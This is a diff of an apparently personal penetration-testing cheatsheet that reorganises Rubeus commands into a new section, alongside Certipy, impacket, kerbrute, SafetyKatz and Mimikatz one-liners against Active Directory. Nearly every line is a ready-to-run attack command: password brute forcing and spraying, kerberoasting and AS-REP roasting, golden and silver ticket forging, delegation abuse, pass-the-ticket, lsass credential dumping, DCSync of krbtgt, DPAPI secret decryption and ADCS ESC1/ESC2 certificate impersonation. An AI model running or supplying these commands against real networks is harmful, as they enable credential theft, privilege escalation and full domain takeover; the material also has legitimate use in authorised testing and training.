@@ -1,6 +1,43 @@
 # CHEATSHEETS
 
-Certipy-AD
+# RUBEUS
+
+﻿rubeus.exe asktgt /user:livestep /password:Password@1		# pedido de um Ticket Granting Ticket (TGT) ao KDC
+rubeus.exe asktgt /user:livestep /rc4:64256...		# # pedido de um Ticket Granting Ticket (TGT) ao KDC using RC4
+rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local		# create a TGS for LDAP service
+rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==		# renew function in Rubeus builds a TGT renewal exchange | Can use /ptt
+rubeus.exe renew /dc:dc1.ignite.local /autorenew		# put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket
+rubeus.exe brute /password:Password@1 /noticket		# perform a password bruteforce attack against all the existing user accounts in Active Directory |  /noticket can be used in conjunction with this option since no ticket is provided with this functionality
+rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1		# taking in passwords and generate hashes of it
+rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt		# performed an attack called “Resource-Based Constrained Delegation” which benefits the msDS-AllowedToActOnBehalfOfAnotherIdentity option set in the attribute’s editor
+rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1; rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd		# first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so | Golden Ticket
+rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1; rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt		# SILVER TICKET 
+rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==		# Import Ticket to the session
+rubeus.exe purge		# purge/delete all the tickets existing in the current session | | /luid: This flag can be used to provide a specific user ID
+rubeus.exe describe /ticket:doIFNDCCBTCg...bA==		# view details about a particular base64 encrypted blob or ticket.kirbi file
+rubeus.exe triage	# lists all the tickets | /luid: This flag can be used to provide a specific user ID
+rubeus.exe dump		# dump all tickets |  /luid can be provided to dump specific user’s tickets. | /service can be used to filter these tickets. (/service:krbtgt)
+rubeus.exe tgtdeleg		# exploit the Generic Security Service Application Program Interface (GSS-API) trick and allows you to extract a usable TGT .kirbi file from the current user’s session
+rubeus.exe monitor /targetuser:noob$ /interval:10		# monitor function can periodically extract all TGTs every x seconds | /targetuser: Only the specified user’s tickets will be returned
+rubeus.exe harvest /interval:30		# extracts TGTs every x seconds | keeps a cache of any extracted TGTs and any tickets about to expire are autorenewed | /nowrap filter: Displays tickets in a single line (very helpful)  | /runfor: Can specify the end time of harvest option
+rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local		# kerberoasting
+rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /tgtdeleg	# Kerberoasting | /tgtdeleg can be used to perform the tgt delegation trick to roast all rc4 enabled accounts
+rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /creduser:ignite.local\Administrator /credpassword:Ignite@987		#  domain credentials to perform Kerberoasting and searching for users to kerberoast
+rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local		# Asreproast
+rubeus.exe asreproast /user:harshitrajpal /ldaps 		# If /ldaps is used, LDAP query shall go over secured LDAP (port 636)
+rubeus.exe createnetonly /program:"C:\Windows\System32\upnpcont.exe" /ticket:ticket.kirbi		# create a new hidden process while returning the ID and LUID
+rubeus.exe changepw /ticket:doIFNDCC...bA== /new:Password@1!!!		# Change Password
+rubeus.exe currentluid		# display current LUID
+Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>  	# kerberos bruteforce
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt      # rubeus Over Pass the hash (OPTH) generate tokens from hashes or keys (doesn't need elevation)
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt     # rubeus Over Pass the hash (OPTH) generate tokens from hashes or keys (doesn't elevation)
+Rubeus.exe kerberoast /stats    # rubeus list Kerberoast stats
+Rubeus.exe kerberoast /user:svcadmin /simple        # request a TGS
+Rubeus.exe monitor /interval:5 /nowrap      # capture the TGT of dcorp-dc$ Printer Bug Unconstrained Delegation
+Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx	# ADCS | ESC1 | Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
+
+
+#Certipy-AD
 
 certipy-ad find -u livestep -p 12345 -dc-ip 192.168.1.20 -target-ip 192.168.1.20 -vulnerable -enable -stdout	#Find certificate templates with misconfigurations
 certipy-ad account -u livestep -p 12345 -dc-ip 192.168.1.20 -target 192.168.1.20 -user user_personification read	# enumerate and extract key attributes from the user_personification account
@@ -98,13 +135,12 @@ kerbrute -users users.txt -domain <domain> -dc-ip $IP # kerberos bruteforce
 kerbrute passwordspray -d lab.ropnop.com domain_users.txt Password123   # Password spraying
 
 
-Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>  	# kerberos bruteforce
+
 
 ## ASREPROAST
 
 impacket-GetNPUsers <domain>/ -usersfile <users> -format john -dc-ip $IP # asreproast
 
-Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>	# asreproast
 
 impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'﻿	# After download the masterkey to output the key
 impacket-dpapi credential -f DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84﻿	# Use the key in the DPAPI Credentials Files
@@ -1129,12 +1165,7 @@ SafetyKatz.exe "sekurlsa::ekeys"        # SafetyKatz Minidump of lsass and PELoa
 SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys>  /run:cmd.exe" "exit"      # Over Pass the hash (OPTH) generate tokens from hashes or keys
 SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"     # SafetyKatz DCSync
 
-# RUBEUS
 
-Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt      # rubeus Over Pass the hash (OPTH) generate tokens from hashes or keys (doesn't need elevation)
-Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt     # rubeus Over Pass the hash (OPTH) generate tokens from hashes or keys (doesn't elevation)
-Rubeus.exe kerberoast /stats    # rubeus list Kerberoast stats
-Rubeus.exe kerberoast /user:svcadmin /simple        # request a TGS
 
 
 # PERSISTENCE
@@ -1147,9 +1178,8 @@ Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentCon
 
 # Priv Esc – Unconstrained Delegation - Printer Bug
 
-Rubeus.exe monitor /interval:5 /nowrap      # capture the TGT of dcorp-dc$ Printer Bug Unconstrained Delegation
+
 MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local         # run MS-RPRN.exe Printer Bug (https://github.com/leechristensen/SpoolSample) Unconstrained Delegation
-Rubeus.exe ptt /ticket:<base64 encode>      # Printer Bug Copy the base64 encoded TGT, remove extra spaces (if any) Unconstrained Delegation
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'     #  Printer Bug Once the ticket is injected, run DCSync Unconstrained Delegation
 
 # FIREWALL EVASION SCAN
@@ -1626,7 +1656,7 @@ Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /alt
 certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN	 # ADCS | ESC1 | request a Certificate and add an alternative name (user to impersonate)
 certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'	 # ADCS | ESC1 | request a Certificate and add an alternative name (user to impersonate)
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx	# #	ADCS | ESC1 | Use OpenSSL and convert the certificate, do not enter a password
-Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx	# ADCS | ESC1 | Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
+
 ## # ADCS ENUMERATION | CERTICATES | ESC2 | Misconfigured Certificate Templates
 PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'	# ADCS | ESC2 | Request a certificate specifying the /altname as a domain admin like in ESC1
 python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'	# ADCS | ESC2 | Request a certificate specifying the /altname as a domain admin like in ESC1
